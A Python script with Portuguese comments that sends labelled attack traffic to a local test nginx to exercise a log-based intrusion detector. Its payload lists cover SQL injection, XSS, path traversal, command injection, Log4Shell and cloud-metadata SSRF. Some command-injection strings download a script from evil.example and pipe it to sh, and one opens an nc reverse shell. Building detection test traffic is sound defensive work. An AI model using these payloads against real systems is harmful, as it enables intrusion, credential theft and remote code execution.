#!/usr/bin/env python3
"""Traffic generator for testing the detector.

Dispara requisições HTTP **reais** contra o nginx de teste, que escreve o log no
volume compartilhado, que o detector lê. O caminho completo é exercitado — parser
incluído.

Escrever linhas direto no arquivo de log seria mais simples e testaria menos: o
nginx escapa aspas, normaliza o path e decide o código de resposta, e é
justamente aí que um parser costuma quebrar.

    docker compose -f dev-log/compose.yml up -d
    python dev-log/simulate.py mixed -n 100
    python dev-log/simulate.py sqli -n 50 --rate 20

Modos: normal, sqli, xss, traversal, cmdi, log4shell, ssrf, scanner, flood, mixed

Só depende da biblioteca padrão — roda sem instalar nada.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from collections.abc import Callable

DEFAULT_TARGET = "http://localhost:8080"

# ---------------------------------------------------------------------------
# Cargas
# ---------------------------------------------------------------------------

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]

SCANNER_AGENTS = [
    "sqlmap/1.8#stable (https://sqlmap.org)",
    "Nikto/2.5.0",
    "gobuster/3.6",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "python-requests/2.32.3",
    "masscan/1.3",
]

NORMAL_PATHS = [
    "/", "/index.html", "/api/produtos", "/api/pedidos", "/api/usuarios",
    "/sobre", "/contato", "/blog", "/login",
]

NORMAL_QUERIES = ["", "", "", "pagina=2", "q=notebook", "limit=50&offset=100", "ordenar=preco"]

SQLI = [
    "id=1' OR '1'='1",
    "id=1' UNION SELECT NULL,usuario,senha FROM usuarios--",
    "id=1; DROP TABLE pedidos--",
    "id=1' AND SLEEP(5)--",
    "id=-1 UNION ALL SELECT NULL,table_name FROM information_schema.tables",
    "busca=admin'--",
    "id=1' UNI/**/ON SEL/**/ECT senha FROM contas--",
    "id=1'; EXEC xp_cmdshell('whoami')--",
]

XSS = [
    "q=<script>alert(document.cookie)</script>",
    "nome=<img src=x onerror=alert(1)>",
    "html=<svg onload=alert(1)>",
    "url=javascript:alert(document.domain)",
    "c=<iframe src=javascript:alert(1)>",
    "t=<details open ontoggle=alert(1)>",
]

TRAVERSAL = [
    "arquivo=../../../../etc/passwd",
    "file=..%2f..%2f..%2fetc%2fshadow",
    "path=%252e%252e%252fetc%252fpasswd",
    "doc=....//....//etc/passwd",
    "t=../../.git/config",
    "f=../../.aws/credentials",
]

CMDI = [
    "host=127.0.0.1; cat /etc/passwd",
    "ip=8.8.8.8 | whoami",
    "cmd=$(curl http://evil.example/s.sh)",
    "target=`id`",
    "h=127.0.0.1; wget http://evil.example/x.sh | sh",
    "p=127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
]

LOG4SHELL = [
    "${jndi:ldap://evil.example/a}",
    "${jndi:rmi://evil.example:1099/obj}",
    "${${lower:j}${lower:n}di:ldap://evil.example/x}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/z}",
]

SSRF = [
    "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "target=http://metadata.google.internal/computeMetadata/v1/",
    "fetch=http://127.0.0.1:6379/",
    "src=gopher://127.0.0.1:6379/_INFO",
    "u=file:///etc/passwd",
]

SCANNER_PATHS = [
    "/wp-admin/", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/",
    "/.env", "/.git/config", "/admin.php", "/shell.php", "/c99.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/actuator/env", "/server-status", "/config.php.bak", "/backup.sql",
    "/cgi-bin/test-cgi", "/HNAP1/", "/boaform/admin/formLogin",
]


def spoofed_ip(rng: random.Random, attacker: bool) -> str:
    """IP de origem falso.

    Faixas reservadas para documentação (RFC 5737): 203.0.113.0/24 para tráfego
    normal, 198.51.100.0/24 para ataque. Nunca roteáveis, então não há como
    apontar acidentalmente para um host real.
    """
    block = "198.51.100" if attacker else "203.0.113"
    return f"{block}.{rng.randint(1, 254)}"


# ---------------------------------------------------------------------------
# Geradores de requisição
# ---------------------------------------------------------------------------

Request = tuple[str, str, str]  # (path_com_query, user_agent, ip)


def gen_normal(rng: random.Random) -> Request:
    path = rng.choice(NORMAL_PATHS)
    query = rng.choice(NORMAL_QUERIES)
    return (
        f"{path}?{query}" if query else path,
        rng.choice(BROWSER_AGENTS),
        spoofed_ip(rng, attacker=False),
    )


def _injection(rng: random.Random, payloads: list[str], paths: list[str]) -> Request:
    return (
        f"{rng.choice(paths)}?{payloads[rng.randrange(len(payloads))]}",
        rng.choice(SCANNER_AGENTS if rng.random() < 0.6 else BROWSER_AGENTS),
        spoofed_ip(rng, attacker=True),
    )


def gen_sqli(rng: random.Random) -> Request:
    return _injection(rng, SQLI, ["/api/produtos", "/api/usuarios", "/login", "/"])


def gen_xss(rng: random.Random) -> Request:
    return _injection(rng, XSS, ["/", "/api/produtos", "/blog"])


def gen_traversal(rng: random.Random) -> Request:
    return _injection(rng, TRAVERSAL, ["/", "/api/pedidos"])


def gen_cmdi(rng: random.Random) -> Request:
    return _injection(rng, CMDI, ["/api/produtos", "/"])


def gen_log4shell(rng: random.Random) -> Request:
    payload = rng.choice(LOG4SHELL)
    # A variante realista chega em cabeçalho, não na URI.
    if rng.random() < 0.6:
        return (rng.choice(NORMAL_PATHS), payload, spoofed_ip(rng, attacker=True))
    return (
        f"/api/produtos?x={urllib.parse.quote(payload)}",
        rng.choice(BROWSER_AGENTS),
        spoofed_ip(rng, attacker=True),
    )


def gen_ssrf(rng: random.Random) -> Request:
    return _injection(rng, SSRF, ["/api/produtos", "/"])


def gen_scanner(rng: random.Random) -> Request:
    return (
        rng.choice(SCANNER_PATHS),
        rng.choice(SCANNER_AGENTS),
        # IP fixo por rodada: varredura vem de uma origem só, e é isso que faz as
        # features de janela por IP dispararem.
        f"198.51.100.{rng.randint(200, 210)}",
    )


def gen_flood(rng: random.Random) -> Request:
    return (
        rng.choice(["/login", "/api/usuarios", "/"]),
        rng.choice(BROWSER_AGENTS),
        "198.51.100.250",  # um IP só: o sinal é o volume
    )


GENERATORS: dict[str, Callable[[random.Random], Request]] = {
    "normal": gen_normal,
    "sqli": gen_sqli,
    "xss": gen_xss,
    "traversal": gen_traversal,
    "cmdi": gen_cmdi,
    "log4shell": gen_log4shell,
    "ssrf": gen_ssrf,
    "scanner": gen_scanner,
    "flood": gen_flood,
}

# Maioria benigna, como em tráfego real. Um `mixed` meio a meio daria uma
# impressão irreal de quanto ruído o dashboard mostra.
MIXED_WEIGHTS = {
    "normal": 60,
    "sqli": 6, "xss": 6, "traversal": 5, "cmdi": 4,
    "log4shell": 3, "ssrf": 4, "scanner": 8, "flood": 4,
}


def encode_target(path_with_query: str) -> str:
    """Percent-encode o alvo da requisição preservando os separadores.

    Necessário porque `http.client` recusa espaço e caractere de controle na linha
    de requisição — e as cargas têm espaço de sobra (`; cat /etc/passwd`).

    Não enfraquece o teste: é assim que um ataque real chega pela rede, e o
    detector decodifica em duas passadas antes de casar as regras. O que muda é
    que o teste passa a exercitar também o caminho de decodificação.

    `safe` mantém `=` e `&` intactos para o nginx ainda enxergar os parâmetros.
    """
    path, separator, query = path_with_query.partition("?")
    encoded_path = urllib.parse.quote(path, safe="/%")
    if not separator:
        return encoded_path
    return f"{encoded_path}?{urllib.parse.quote(query, safe='=&%')}"


def send(target: str, request: Request, timeout: float) -> int:
    path, agent, ip = request
    url = target.rstrip("/") + encode_target(path)
    http_request = urllib.request.Request(  # noqa: S310 — URL montada por nós
        url,
        headers={
            "User-Agent": agent,
            # O nginx de teste está com real_ip_header X-Forwarded-For, então o
            # log registra este IP como origem.
            "X-Forwarded-For": ip,
            "Accept": "*/*",
        },
        method="GET",
    )
    try:
        with urllib.request.urlopen(http_request, timeout=timeout) as response:  # noqa: S310
            return int(response.status)
    except urllib.error.HTTPError as exc:
        # 404 e 403 são resultado esperado para sonda — não é erro.
        return int(exc.code)
    except (urllib.error.URLError, TimeoutError, OSError):
        return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Gera tráfego HTTP de teste contra o nginx do dev-log.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Modos: " + ", ".join([*GENERATORS, "mixed"]),
    )
    parser.add_argument("mode", choices=[*GENERATORS, "mixed"], help="tipo de tráfego")
    parser.add_argument("-n", "--count", type=int, default=100, help="número de requisições")
    parser.add_argument("--rate", type=float, default=25.0, help="requisições por segundo")
    parser.add_argument("--target", default=DEFAULT_TARGET, help=f"padrão: {DEFAULT_TARGET}")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--seed", type=int, default=None)
    args = parser.parse_args(argv)

    rng = random.Random(args.seed)
    delay = 1.0 / args.rate if args.rate > 0 else 0.0

    modes = list(MIXED_WEIGHTS) if args.mode == "mixed" else [args.mode]
    weights = list(MIXED_WEIGHTS.values()) if args.mode == "mixed" else [1]

    print(f"Enviando {args.count} requisições ({args.mode}) para {args.target} a ~{args.rate}/s")

    statuses: Counter[int] = Counter()
    by_mode: Counter[str] = Counter()
    started = time.monotonic()

    try:
        for index in range(args.count):
            mode = rng.choices(modes, weights=weights)[0]
            status = send(args.target, GENERATORS[mode](rng), args.timeout)

            statuses[status] += 1
            by_mode[mode] += 1

            if status == 0 and index == 0:
                print(
                    f"\nNão consegui falar com {args.target}.\n"
                    "O nginx de teste está no ar?\n"
                    "    docker compose -f dev-log/compose.yml up -d",
                    file=sys.stderr,
                )
                return 1

            if delay:
                time.sleep(delay)

            if (index + 1) % 25 == 0:
                print(f"  {index + 1}/{args.count}")
    except KeyboardInterrupt:
        print("\ninterrompido")

    elapsed = time.monotonic() - started
    total = sum(statuses.values())
    print(f"\n{total} requisições em {elapsed:.1f}s ({total / max(elapsed, 0.001):.1f}/s)")
    print("respostas: " + ", ".join(f"{code}={n}" for code, n in sorted(statuses.items())))
    if len(by_mode) > 1:
        print("tipos:     " + ", ".join(f"{m}={n}" for m, n in by_mode.most_common()))
    print("\nOs alertas devem aparecer no dashboard em alguns segundos.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
